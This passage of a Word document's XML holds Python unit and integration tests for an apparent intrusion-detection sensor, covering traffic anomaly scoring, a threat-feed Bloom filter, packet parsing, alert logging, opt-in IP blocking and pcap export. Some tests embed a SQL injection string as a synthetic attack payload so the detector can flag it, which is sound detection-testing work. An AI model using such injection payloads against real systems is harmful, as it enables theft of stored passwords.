    <w:p w14:paraId="7E6076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pps, ports in ((9000, 1), (60, 45), (300, 400)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B3C6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self.assertTrue(e.analyse(pps, ports).is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDB5E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"pps=%d ports=%d not flagged" % (pps, ports))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C8368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E075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test_anomalies_do_not_poison_the_model(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7311C3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self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7E53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baseline_before = e.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0857A4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range(30):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2553A9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e.analyse(9000, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15ACAE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self.assertEqual(e.distance_baseline(), baseline_before)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CADF2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and it is still alerting after 30 seconds of attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583C3E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self.assertTrue(e.analyse(9000, 1).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A25BC7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BAD9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test_confidence_grows_with_distance(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2D27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e = self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024F06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near = e.analyse(60, 45).confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC962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far = e.analyse(90000, 1).confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DD4E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self.assertGreater(far, near)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792C337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BEA0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0F65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TestBloomThreatIntel(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAA11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33788D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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E8C0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self.path = os.path.join(self.tmp, "feed.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263BD8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open(self.path, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E77D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f.write("# comment line\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCD9A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"\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BF8B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"192.0.2.1\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145441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"198.51.100.23  # inline note\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F614C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"203.0.113.5,csv style comment\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BCC5C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FC9D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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C216D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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19721A9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97400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test_feed_loads_and_strips_comments(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024FBD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bloom.BloomFilter(size=500, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48300D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self.assertEqual(bf.load_feed(self.path), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768B66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("192.0.2.1", "198.51.100.23", "203.0.113.5"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDF63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self.assertTrue(bf.check(ip), "%s not loaded" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01035C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FC9B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test_unlisted_address_is_clean(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD743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bloom.BloomFilter(size=500, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165047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bf.load_feed(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D28B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self.assertFalse(bf.check("8.8.8.8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482E58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1394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test_missing_feed_reports_failure(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B28CB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bloom.BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77262E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self.assertEqual(bf.load_feed(os.path.join(self.tmp, "nope.txt")), -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC583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A4FF7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test_false_positive_rate_grows_with_saturation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C8F4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bloom.BloomFilter(size=64, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5050E7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start = bf.false_positive_rate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD73F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range(20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB215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    bf.add("10.0.0.%d" % i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FD35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self.assertGreater(bf.false_positive_rate(), start)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D049DC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25EB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test_no_false_negatives(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADACC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defining Bloom guarantee: anything added is always found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DEA6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bf = bloom.BloomFilter(size=2000, hash_count=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A7A9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added = ["172.16.%d.%d" % (i, j) for i in range(10) for j in range(10)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2925AF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added:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CCEC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bf.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41ACC9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ip in added:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBFFA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self.assertTrue(bf.check(ip))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0972D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86A24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0C5C4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463CEB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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A239A4B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src/tests/test_integration.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E2EE56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(405 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DE30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550442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"""Integration tier of the V-Model test strategy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6BC0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CA3C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Chapter 6.1 defines three testing tiers - unit, integration and system-level.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009038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`test_engines.py` covers the unit tier by exercising each engine's mathematics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DED4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 isolation. This module covers the integration tier: it verifies that the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8190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components work correctly *together* along the real data path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5797A0E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047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raw frame -&gt; PacketParser -&gt; engines -&gt; AlertDispatcher -&gt; log / telemetry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EEF0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            -&gt; PacketStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9918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             -&gt; pcap export</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524734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AD08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Nothing here needs root, a network interface or live attack traffic, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5924EF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integration tier is reproducible on any machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790BC16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307421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7E62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0386C7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64A078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shutil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4D01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5439DC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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC51A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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06898CD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5EC9D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4161F9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66ACCB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0E0077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42F764F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7E944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replay</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF6BE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sensor_node.dispatcher as dispatcher_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2709E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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423686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sensor_node.sensor as sensor_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DC5D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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F230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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463B66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6FDB31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utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47173C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694D3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FC52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_RecordingDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4050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"""Stands in for iptables so tests never touch the host firewall."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406594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F0CE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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18391D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self.blocked = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621C727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60D5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block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DAB4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self.blocked.append(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225455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186AB59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0C437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826F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TestParserToEngines(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EE35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 synthetic attack frame must survive decode and reach a verdict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D96D4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70AB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2375F4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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F25E3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B92AE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test_sqli_frame_decodes_and_is_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753B7A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engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DDEC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 = parser_mod.build_tcp(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD735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sport=44000, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34212E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data=b"GET /?id=1 UNION SELECT password FROM users --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780CAA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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F647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1245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self.assertIsNotNone(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47125A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self.assertEqual(pkt["proto"], "TCP")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2618C8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self.assertEqual(pkt["dport"], 80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE03E1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8BB52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verdict = nb.PayloadMonitor().analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45633B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self.assertTrue(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFE4C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self.assertIn("UNION", verdict.detail["keywords"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CFC24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55C80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test_benign_frame_is_not_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BA61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engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612DE6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 = parser_mod.build_tcp(data=b"GET /index.html HTTP/1.1\r\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39007F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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632303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self.assertFalse(nb.PayloadMonitor().analyse(pkt["payload"]).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5140A0B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6361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test_truncated_frame_does_not_raise(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9F77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a malformed frame must be rejected, not crash the analyzer thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C9EE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bad in (b"", b"\x00" * 8, b"\xff" * 20, None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D972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self.assertIsNone(self.parser.parse(bad))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1BB2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self.assertEqual(self.parser.parsed, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D975F3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2BFC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test_vlan_tagged_frame_is_decoded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6976ED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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128B7B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inner = parser_mod.build_tcp(sport=1234, dport=443)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0314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splice an 802.1Q tag between the MAC addresses and the EtherType</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3431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tagged = (inner[:12] + struct.pack("!HH", 0x8100, 0x0064)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066E38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+ struct.pack("!H", 0x0800) + inner[14:])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D79BF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 = self.parser.parse(tagged)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C190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self.assertIsNotNone(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C96A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self.assertEqual(pkt["dport"], 443)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580302F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95EE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test_icmp_frame_is_decoded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E537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pkt = self.parser.parse(parser_mod.build_icmp(icmp_type=8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A055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self.assertEqual(pkt["proto"], "ICMP")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060C0C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self.assertEqual(pkt["icmp_type"], 8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173F003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6F724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4CA8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TestDispatcherFanOut(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E3DF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"""One dispatch call must reach every configured sink exactly once."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFBC12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2CF57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3DD2A8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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A3C6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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07105A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self.config.log_file = os.path.join(self.tmp, "alerts.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1959DD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self.logger = logger_mod.Logger(self.config.log_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27855C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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4238DF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self.defense = _RecordingDefense()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD1DAC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FC3C5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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147FE0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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D5C7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62C4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_dispatcher(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44187B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dispatcher_mod.AlertDispatcher(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3A34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self.config, logger=self.logger, defense=self.defense)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2603CE0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B04B6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test_alert_written_with_all_fr4_columns(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDF9D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63A35A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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDE9E9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src_ip="192.0.2.5", confidence=0.97,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537620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payload=b"id=1 UNION SELECT pw FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D5498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7310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csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635257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open(self.config.log_file, newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FED6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 = list(csv.DictReader(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13655E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E34E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self.assertEqual(len(rows), 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5536A1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 = rows[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEF64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column in ("Timestamp", "Source IP", "Engine", "Verdict",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E12E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"Severity", "Risk Score", "Confidence",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB101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"ATT&amp;CK Technique", "Payload Excerpt"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1784A5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self.assertIn(column, row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D001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self.assertEqual(row["Source IP"], "192.0.2.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D04E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self.assertIn("T1190", row["ATT&amp;CK Technique"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466A2E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self.assertTrue(float(row["Risk Score"]) &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728251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7D64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test_blocking_disabled_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418779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NFR-3: active defence must be opt-in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054621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6E81BA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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", src_ip="10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E6F9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self.assertEqual(self.defense.blocked, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F5C6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DB4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test_blocking_when_enabled(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4E2E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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756B0A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26843F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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", src_ip="10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A96F9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self.assertEqual(self.defense.blocked, ["10.0.0.5"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFA8F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6F8D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test_response_status_says_flagged_when_blocking_is_disabled(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A669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702501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d.dispatch("BLACKLISTED IP DETECTED: 10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C320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kind="blacklist", src_ip="10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C9EC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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B88D8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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE1B1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= f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C65E7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self.assertIn("(Flagged)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C722C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self.assertNotIn("(Blocked)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031492A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74B23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test_response_status_says_blocked_only_after_success(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A1AC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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5DEE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779892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meta = d.dispatch("BLACKLISTED IP DETECTED: 10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334A1C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kind="blacklist", src_ip="10.0.0.66",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D31DC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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDDCA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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BE7B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= f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9E61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self.assertTrue(meta["blocked"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20110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self.assertIn("(Blocked)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486562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48AFF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test_every_engine_kind_can_trigger_a_block(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138611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Chapter 5.7 states that *any* engine may trigger a block</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1953BA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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C184C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0B2B1E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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1037B4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("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)", "10.0.0.1"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440A70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("PORT SCAN DETECTED! (Unique Ports: 90/sec)", "10.0.0.2"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F91D2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("MALICIOUS PAYLOAD! Keywords: ['UNION']", "10.0.0.3"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783E91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("BLACKLISTED IP DETECTED: 10.0.0.4 (Flagged)", "10.0.0.4"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135E8D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2D6135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message, ip in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053BE8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d.dispatch(message, src_ip=ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6659B8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self.assertEqual(self.defense.blocked,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B089C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["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346256C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BA8BB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test_whitelisted_ip_is_never_blocked(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533BA2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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C43F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50C645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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6170E4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src_ip="127.0.0.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F235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self.assertEqual(self.defense.blocked, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FF75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35A8B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test_duplicate_block_inserted_once(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B837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self.config.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D467D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245AC0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range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A9E7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d.dispatch("DDoS DETECTED! Z-Score: 9.1 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391B3C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src_ip="10.0.0.9")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EB12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self.assertEqual(self.defense.blocked, ["10.0.0.9"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2941A6F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AF83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test_duplicate_alert_is_published_once(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266739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6106A3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range(2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BAD4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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587F56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src_ip="192.0.2.55", confidence=0.95)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281EE8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self.assertEqual(d.total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D49F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self.assertEqual(self.logger.rows_written, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C01DF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EED94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test_pii_is_redacted_before_persistence(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6DCB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NFR-3 / DPA 2018: credentials must not reach the audit log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3602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 = self._dispatcher()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191CA7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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5F51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src_ip="192.0.2.9", confidence=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CC1A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payload=b"user=bob@example.com&amp;password=hunter2&amp;id=1 UNION")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2C3D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open(self.config.log_file, encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4419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= f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9B09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self.assertNotIn("bob@example.com", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCDF7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self.assertNotIn("hunter2", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1499ED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self.assertIn("REDACTED", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703697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52DA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92D7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TestPacketStoreToPcap(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E744A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"""The in-memory buffer must serialise to a file Wireshark can read."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E67FCC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598D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64926E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self.store = packet_store.PacketStore(maxlen=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B651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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D51B4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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5290EC7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CC77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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B146D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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BDFB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6FB4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test_buffer_exports_as_readable_pcap(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507875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frames = [parser_mod.build_tcp(sport=5000 + i, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382DF2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data=b"GET / HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AB76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for i in range(6)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF952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frames.append(parser_mod.build_udp(data=b"dns"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CD32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frames.append(parser_mod.build_icmp())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B29AF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94C5B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frame in frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41554E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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C218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self.store.add({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3140C1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"ts": 1700000000.5, "time": "12:00:00",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C522F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"src": pkt["src"], "dst": pkt["dst"], "proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E34B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"sport": pkt["sport"], "dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E437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"length": pkt["length"], "info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3E53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"verdict": "clean", "hex": frame.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3511C1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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054702A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03DAE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data = pcap.build_from_records(self.store.all_packets())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294FCC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path = os.path.join(self.tmp, "out.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75766B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open(path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFD0D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f.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F697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1762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 = pcap.PcapReader(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071B66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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413140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recovered = list(reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198B85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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188085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86F48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self.assertEqual(len(recovered), len(frames))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755EB3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every recovered frame must decode back to the same 5-tuple</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D11AB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(_ts, raw, _orig), original in zip(recovered, frames):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E390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self.assertEqual(raw, original)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1B9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self.assertIsNotNone(parser_mod.PacketParser().parse(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0AA9E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2604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test_ring_buffer_is_bounded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287632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i in range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597B3E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self.store.add({"ts": 0, "src": "1.1.1.1", "proto": "TCP",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6811CA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"length": 60, "hex": "00"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9218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self.assertEqual(self.store.stats_snapshot()["buffered"], 50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BACA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self.assertEqual(self.store.stats_snapshot()["total_seen"], 200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710657E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67394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0CEB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TestIntervalSourceAttribution(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BCFC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"""Aggregate alerts may name a source only when dominance is defensible."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013D9B8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8368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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535DF7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self.sensor = sensor_mod.SensorNode.__new__(sensor_mod.SensorNode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FB9A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self.sensor.config = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D75C41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EF5F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test_dominant_source_is_attributed_above_threshold(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3801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{</w:t>
      </w:r>
    </w:p>
